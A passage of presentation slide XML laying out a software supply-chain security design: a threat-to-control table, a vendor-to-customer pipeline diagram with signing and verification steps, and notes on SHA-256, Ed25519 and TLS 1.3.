                        <a:t>Our control (module)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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Storage credential could change a release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Storage access ≠ release authority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Ed25519 manifest signature (sign.py)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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Script ran without verification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Automatic, mandatory verification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Fail-closed gate (security_gate.py)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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Checksum unsigned and optional</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Hash bound to vendor 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SHA-256 inside signed manifest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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Leaked keys stay trusted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Instant key invalidation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Key revocation list (key_manager.py)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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Any signer / old version accepted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Zero-trust admission policy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Signer, key ID, version rules (policy.py)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603504">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr wrap="square"/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1250" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="222222"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                        </a:rPr>
                        <a:t>Months undetected, no evidence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Visible, recorded decisions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SQLite audit log + Flask dashboard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Proposed Architecture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1371600"/>
            <a:ext cx="2788920" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6EFFA"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="8FB3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20040" y="1399032"/>
            <a:ext cx="2788920" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>VENDOR  (trusted)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3246120" y="1371600"/>
            <a:ext cx="2331720" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEF1F4"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="AAB4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46120" y="1399032"/>
            <a:ext cx="2331720" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DISTRIBUTION  (untrusted)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5715000" y="1371600"/>
            <a:ext cx="3108960" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4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715000" y="1399032"/>
            <a:ext cx="3108960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CUSTOMER CI/CD</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1737360"/>
            <a:ext cx="2423160" cy="402336"/>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Developer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2258568"/>
            <a:ext cx="2423160" cy="53035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Source repository</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>approved repo URL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="2139696"/>
            <a:ext cx="0" cy="118872"/>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20" y="2907791"/>
            <a:ext cx="2423160" cy="53035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build.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-256 + SLSA provenance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="Connector 14"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="2788920"/>
            <a:ext cx="0" cy="118871"/>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 y="3557015"/>
            <a:ext cx="2423160" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D6E6F7"/>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sign.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>canonical JSON + Ed25519</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="17" name="Connector 16"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="3438144"/>
            <a:ext cx="0" cy="118871"/>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4206240"/>
            <a:ext cx="2423160" cy="53035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key_manager.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>keys · rotation · CRL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rounded Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="4855464"/>
            <a:ext cx="2423160" cy="53035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Signed manifest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>+ provenance + artifact</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="Connector 19"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="3822191"/>
            <a:ext cx="0" cy="1298449"/>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429000" y="2377440"/>
            <a:ext cx="1965960" cy="6858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Storage / CDN / mirror</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>simulated by artifacts/</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rounded Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="3611880"/>
            <a:ext cx="1965960" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C5CD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TLS 1.3 transport</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="23" name="Connector 22"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="2926080" y="2743200"/>
            <a:ext cx="502920" cy="2377440"/>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11980" y="3063240"/>
            <a:ext cx="0" cy="548640"/>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897880" y="1737360"/>
            <a:ext cx="2743200" cy="50292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ci/security_gate.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>exit 0 / exit 1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="26" name="Connector 25"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5394960" y="2103120"/>
            <a:ext cx="502920" cy="175564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897880" y="2395728"/>
            <a:ext cx="2743200" cy="1481328"/>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897880" y="2414016"/>
            <a:ext cx="2743200" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>verifier/verify.py</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rounded Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="274320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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1 Schema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Rounded Rectangle 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="274320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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2 CRL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rounded Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7726679" y="274320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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>3 Policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rounded Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="329184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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>4 Ed25519</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rounded Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="329184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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5 SHA-256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rounded Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7726679" y="329184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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>6 Provenance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="35" name="Connector 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="2240280"/>
            <a:ext cx="0" cy="15544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583680" y="4069080"/>
            <a:ext cx="1371600" cy="4114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Verdict</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="37" name="Connector 36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="3877056"/>
            <a:ext cx="0" cy="192024"/>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897880" y="4754880"/>
            <a:ext cx="1234440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D5F0DE"/>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1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEPLOY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>exit 0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Rounded Rectangle 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="4754880"/>
            <a:ext cx="1234440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBD9D6"/>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B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>BLOCK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>exit 1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="40" name="Connector 39"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6510528" y="4480560"/>
            <a:ext cx="438912" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1A7F4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589520" y="4480560"/>
            <a:ext cx="438911" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="B4231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20040" y="5833872"/>
            <a:ext cx="8503920" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4DE"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C9A2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8A5A00"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>audit/supply_chain_audit.db (SQLite) → dashboard/app.py (Flask)   ·   keys/revoked_keys.json (CRL) + trusted public keys + policy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Cryptographic Design</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="2697480" cy="16916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5488" y="1417320"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>SHA-256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="1783080"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Integrity fingerprint</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="2075688"/>
            <a:ext cx="2514600" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Streams the file in 64 KiB chunks. Any 1-bit change gives a new digest. NOT authentication.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="1371600"/>
            <a:ext cx="2697480" cy="16916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10128" y="1417320"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Ed25519</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="1783080"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Authenticity + integrity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="2075688"/>
            <a:ext cx="2514600" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Signs the canonical manifest (sha256, version, signer, key_id ...). Private key is never distributed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rounded Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1371600"/>
            <a:ext cx="2697480" cy="16916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44768" y="1417320"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="5B4BB0"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>TLS 1.3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="1783080"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Channel protection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="2075688"/>
            <a:ext cx="2514600" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
